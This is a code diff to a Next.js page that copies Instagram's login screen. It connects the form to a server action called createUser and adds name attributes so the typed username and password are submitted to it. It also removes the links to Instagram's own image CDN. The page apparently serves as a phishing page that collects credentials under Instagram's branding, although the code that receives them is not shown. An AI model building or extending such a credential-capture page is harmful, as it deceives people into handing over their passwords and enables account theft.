@@ -1,5 +1,6 @@
 import Image from "next/image";
 import '../styles/globals.css';
+import { createUser } from "./lib/actions";
 
 
 
@@ -9,13 +10,15 @@ export default function Home() {
     <div className="login-container">
       <div className="login-box">
         <h1 className="logo">Instagram</h1>
-        <form className="login-form">
+        <form className="login-form" action={createUser}>
           <input
+            id="user"
+            name="user"
             type="text"
             placeholder="Phone number, username or email address"
             required
           />
-          <input type="password" placeholder="Password" required />
+          <input id="password" name="password" type="password" placeholder="Password" required />
           <button type="submit" className="login-btn">
             Log in
           </button>
@@ -42,8 +45,8 @@ export default function Home() {
       <div className="app-download">
         <p>Get the app.</p>
         <div className="app-buttons">
-          <Image src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="App Store" />
-          <Image src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play" />
+          <Image src="" alt="App Store" />
+          <Image src="" alt="Google Play" />
         </div>
       </div>
       <footer>
